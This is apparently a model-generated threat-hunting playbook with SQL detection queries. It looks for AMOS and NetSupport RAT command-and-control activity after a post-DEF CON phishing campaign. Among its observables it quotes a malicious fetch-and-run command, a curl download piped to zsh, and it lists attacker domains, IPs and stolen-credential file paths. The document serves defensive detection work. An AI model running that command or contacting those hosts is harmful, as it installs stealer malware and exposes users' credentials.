---
analysis: "This hunt correlates network signals with behavioral anomalies\u2014specifically\
  \ processes in temp directories establishing outbound connections\u2014and unauthorized\
  \ file access. This multi-surface approach identifies the intrusion even if the\
  \ static infrastructure indicators have rotated, providing context a single detection\
  \ rule cannot."
blind_spots:
- id: insufficient-telemetry-retention
  owner: SOC Manager
  question: Did the initial beaconing happen before the current lookback window?
  remediation: Extend telemetry retention for network surfaces to 90 days.
  requires: 30-day retention for DNS and proxy logs
  risk: Short retention periods may miss the initial infection handshake, leaving
    only periodic polling visible.
  stage: command-and-control-network
- id: encrypted-traffic-visibility
  owner: Network Engineering
  question: Were the specific malicious URI paths used in HTTPS traffic?
  remediation: Enable SSL inspection for traffic to non-categorized or newly registered
    domains.
  requires: SSL/TLS Inspection
  risk: Without decryption, only domain names are visible; specific malicious paths
    like /api/v1/ and /log cannot be confirmed.
  stage: command-and-control-network
coverage:
- stage: command-and-control-network
  status: covered
  steps:
  - lead-dns-resolutions
  - branch-network-connections
  - branch-http-traffic
  - branch-temp-process-network
- reason: Initial access via social media DMs is handled in a separate phishing hunt.
  stage: initial-access-social-media-phishing
  status: out_of_scope
- reason: Installer execution behavior is covered in the host-execution hunt.
  stage: execution-user-driven-installers
  status: out_of_scope
- reason: The establishment of persistence mechanisms is out of scope for this network-focused
    hunt.
  stage: malware-persistence-establishment
  status: out_of_scope
- reason: Unauthorized access to browser cookies and macOS Notes databases is monitored.
  stage: credential-collection-and-staging
  status: covered
  steps:
  - branch-file-sensitive-access
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: The campaign uses credible lures on trusted platforms like X and
    Google Docs. Identifying the C2 phase is the final opportunity to prevent full
    credential theft and exfiltration of private data by AMOS and NetSupport RAT.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An intruder is communicating with AMOS or NetSupport RAT infrastructure
  through DNS lookups, direct socket connections, or specific HTTP paths, often utilizing
  processes running from temporary directories.
labels:
- hunt
- attack.t1071.001
- attack.t1102
name: Malicious C2 Infrastructure Polling
parameters:
  c2_domains:
    default:
    - apple-googleapi.com
    - gapidriver.com
    - 1foqo.lat
    - 2fksf.lat
    - 3pqow.lat
    description: C2 domains associated with payload delivery and bot communication.
    from:
      kind: article
      observed: '2026-08-19'
      ref: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
    type: list[domain]
  c2_ips:
    default:
    - 86.54.25.213
    - 192.253.248.181
    description: Hardcoded IP addresses used for exfiltration and script hosting.
    from:
      kind: article
      observed: '2026-08-19'
      ref: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
    type: list[ip]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    from:
      kind: manual
      observed: '2026-08-19'
      ref: User input
    type: number
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus on endpoints owned by high-visibility users or those who attended
  recent conferences. Narrow the lookback to the 14 days following Black Hat and DEF
  CON.
references:
- name: "Huntress \u2014 Post-DEF CON Phishing Uses Malicious Google Doc to Deliver\
    \ Malware"
  url: https://www.huntress.com/blog/defcon-phishing-google-doc-malware
related:
- hunt: macos-amos-persistence-mechanisms
  reason: This hunt focuses on network traffic; persistence via LaunchDaemons is handled
    in a companion host-based hunt.
  relation: out-of-scope-alternative
- hunt: windows-netsupport-loader-execution
  reason: Loader execution via ClickOnce and PowerShell is host-based and covered
    in a separate execution hunt.
  relation: out-of-scope-alternative
- hunt: cross-platform-malware-execution-persistence
  relation: follows
scenario:
  stages:
  - name: Social Media Spearphishing
    observables:
    - '@HartmansDoeke'
    - CoinDesk VP lure
    - Google Doc link
    - Dropbox DocSend share
    slug: initial-access-social-media-phishing
    tactic: initial-access
    techniques:
    - T1566.003
  - name: User-Driven Payload Execution
    observables:
    - DecryptPanel.html
    - curl -fsSL https://apple-googleapi.com/i | zsh
    - GAPIUpdate.dmg
    - GapiUpdate.application
    - https://gapidriver.com/installer/GapiUpdate.application
    - sys.ps1
    slug: execution-user-driven-installers
    tactic: execution
    techniques:
    - T1204.002
    - T1059.004
    - T1059.001
  - name: Persistence and Payload Staging
    observables:
    - /Library/LaunchDaemons/com.xdivcmp.plist
    - '%LOCALAPPDATA%\Microsoft\Windows\UpdateCache'
    - ~/.phost
    - ~/.bhost
    - ~/.botid
    - DockerDesktopSvc.exe
    - SteamClientHelperHost.exe
    - TeraCopyMonMon.exe
    slug: malware-persistence-establishment
    tactic: persistence
    techniques:
    - T1543.001
    - T1547.001
  - name: Data Collection and Staging
    observables:
    - Notes.app database access
    - /tmp/lksopo
    - browser cookies
    - keychain data
    - crypto wallets
    slug: credential-collection-and-staging
    tactic: collection
    techniques:
    - T1005
    - T1074.001
    - T1539
    - T1555
  - name: C2 Infrastructure Communication
    observables:
    - 86.54.25.213
    - 192.253.248.181
    - apple-googleapi.com
    - gapidriver.com
    - 1foqo.lat
    - 2fksf.lat
    - 3pqow.lat
    - res10.php
    - res11.php
    - Telegram API
    slug: command-and-control-network
    tactic: command-and-control
    techniques:
    - T1071.001
    - T1102
  summary: A phishing campaign targeting industry conference attendees uses X direct
    messages to lure victims into opening malicious Google Docs and DocSend shares.
    These documents deploy AMOS on macOS via curl-pipe-zsh or disk images, and NetSupport
    RAT or PowerShell loaders on Windows via ClickOnce installers, ultimately establishing
    persistence through LaunchDaemons and staged binaries for data theft and C2 communication.
series:
  index: 2
  slug: post-def-con-phishing-uses-malicious-google-doc-to-deliver-malware
  title: Post-DEF CON Phishing Uses Malicious Google Doc to Deliver Malware
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  network:
    category: network
    name: Network telemetry
    telemetry:
    - network
  web:
    category: siem
    name: Web server / proxy logs
    telemetry:
    - network
tlp: clear
type: investigation
---


# Malicious C2 Infrastructure Polling

This hunt examines the network plane for signs of compromise following the August 2026 post-DEF CON phishing campaign. It targets specific C2 indicators including ephemeral .lat domains and hardcoded IP addresses used for payload delivery and data exfiltration. The hunt corroborates DNS resolutions with socket-level activity and inspects HTTP traffic for URI patterns used by AMOS loaders. Additionally, it identifies behavioral anomalies such as outbound connections from user-writable temporary directories and unauthorized access to macOS Notes and browser profile data, ensuring coverage even if infrastructure indicators rotate.

## lead-dns-resolutions
<!-- DNS resolutions for C2 domains -->
Identify hosts that have resolved domains associated with the phishing campaign infrastructure.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days, c2_domains=c2_domains)
~~~yaml
expected: Rows showing specific hosts resolving the .lat or apple-googleapi domains.
  Silence indicates no known campaign infrastructure was contacted via DNS.
reads:
- device_hostname
- query_hostname
- time
silence: not_evidence_of_absence
source: hb_dns_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, query_hostname, COUNT(*) as resolution_count, MIN(time) as first_seen FROM hb_dns_activity WHERE instr(',' || '{{c2_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0 AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY device_hostname, query_hostname
```

## fan-out-c2-evidence
<!-- Fan-out network and behavioral evidence -->
parallel:
- → branch-network-connections
- → branch-http-traffic
- → branch-temp-process-network
- → branch-file-sensitive-access
join: → triage-c2-activity

## branch-network-connections
<!-- Direct connections to C2 IPs -->
Find established network connections to the hardcoded AMOS/NetSupport IP addresses.

```sqlite target=network role=enrichment params=(lookback_days=lookback_days, c2_ips=c2_ips)
~~~yaml
expected: Socket connections to identified AMOS/NetSupport IPs, revealing the owning
  process.
reads:
- device_hostname
- dst_endpoint_ip
- process_name
- process_path
- time
silence: not_evidence_of_absence
source: hb_network_connection
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, dst_endpoint_ip, process_name, process_path, COUNT(*) as connection_count, MIN(time) as first_seen FROM hb_network_connection WHERE (instr(',' || '{{c2_ips}}' || ',', ',' || dst_endpoint_ip || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY device_hostname, dst_endpoint_ip, process_name, process_path
```

## branch-http-traffic
<!-- HTTP requests to C2 indicators -->
Examine HTTP traffic for malicious domains, IPs, or specific URI patterns associated with AMOS and NetSupport RAT.

```sqlite target=web role=enrichment params=(lookback_days=lookback_days, c2_domains=c2_domains, c2_ips=c2_ips)
~~~yaml
expected: HTTP traffic to campaign infrastructure or matching path patterns. Silence
  indicates no application-layer activity to these indicators was visible.
reads:
- device_hostname
- url_hostname
- url_path
- user_agent
- dst_endpoint_ip
- time
silence: not_evidence_of_absence
source: hb_http_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, url_hostname, url_path, user_agent, dst_endpoint_ip, time FROM hb_http_activity WHERE (instr(',' || '{{c2_domains}}' || ',', ',' || LOWER(url_hostname) || ',') > 0 OR instr(',' || '{{c2_ips}}' || ',', ',' || dst_endpoint_ip || ',') > 0 OR (LOWER(url_path) LIKE '%/log' OR LOWER(url_path) LIKE '%/api/v1/%' OR LOWER(url_path) LIKE '%/core4' OR LOWER(url_path) LIKE '%res%.php')) AND time >= datetime('now', '-{{lookback_days}} days')
```

## branch-temp-process-network
<!-- Connections from temp directories -->
Identify processes running from user-writable paths that are establishing outbound connections, a behavioral indicator of loaders.

```sqlite target=network role=baseline params=(lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: A process in a temp directory communicating externally; a high-confidence
  behavioral lead for payload delivery.
prevalence:
  by: device_hostname
  key:
  - process_path
  rare_below: 3
reads:
- device_hostname
- process_name
- process_path
- dst_endpoint_ip
- dst_endpoint_port
- direction
- time
silence: not_evidence_of_absence
source: hb_network_connection
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, process_name, process_path, dst_endpoint_ip, dst_endpoint_port, time FROM hb_network_connection WHERE (LOWER(process_path) LIKE '%/tmp/%' OR LOWER(process_path) LIKE '%\temp\%' OR LOWER(process_path) LIKE '%\users\public\%') AND direction = 'outbound' AND time >= datetime('now', '-{{lookback_days}} days')
```

## branch-file-sensitive-access
<!-- Sensitive data access by non-standard processes -->
Detect AMOS stealer behavior where non-browser and non-notes processes access macOS Notes databases or browser profile files.

```sqlite target=endpoint role=enrichment params=(lookback_days=lookback_days)
~~~yaml
expected: Access to sensitive credential or note files by unauthorized processes.
  Silence proves absence of this specific stealer behavior.
reads:
- device_hostname
- process_name
- file_path
- activity_name
- time
silence: evidence_of_absence
source: hb_file_activity
verified: dry-run
verified_at: '2026-09-20'
~~~
SELECT device_hostname, process_name, file_path, activity_name, time FROM hb_file_activity WHERE (LOWER(file_path) LIKE '%notestore.sqlite%' OR LOWER(file_path) LIKE '%/cookies' OR LOWER(file_path) LIKE '%/login data') AND NOT (LOWER(process_name) LIKE '%/chrome%' OR LOWER(process_name) LIKE '%/safari%' OR LOWER(process_name) LIKE '%/notes%' OR LOWER(process_name) LIKE '%/mdnsresponder%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## triage-c2-activity
<!-- Weigh C2 and behavioral evidence -->
```agent target=hunter
cite: required
context:
- lead-dns-resolutions
- branch-network-connections
- branch-http-traffic
- branch-temp-process-network
- branch-file-sensitive-access
max_iterations: 4
objective: Analyze the network traffic, DNS resolutions, and sensitive file access
  to determine if any host has been successfully compromised by AMOS or NetSupport
  RAT.
success_criteria: A verdict of malicious | suspicious | benign per host, citing specific
  rows.
tools:
- endpoint
- network
- web
```

## route-on-verdict
<!-- Route on verdict -->
if~: "The triage verdict is malicious for at least one host based on network or file access corroboration." (confidence: high, judge=hunter)
then: → isolate-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: insufficient-telemetry-retention)
else: → close-out

## isolate-host
<!-- Isolate host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the compromised host and revoke any active user credentials.
```
→ analyst-review

## analyst-review
<!-- Analyst review and logic tuning -->
```manual target=analyst
Review the cited network and file access rows. Confirm if the access to browser cookies or Notes databases correlates with an outbound connection to an unknown IP. Document new domains in the threat intelligence feed.
```
→ close-out

## close-out
<!-- Close out hunt -->
```manual target=analyst
Record the hosts examined and the outcome. If no activity was found, log this as evidence of absence for the campaign indicators during the lookback period.
```
→ end
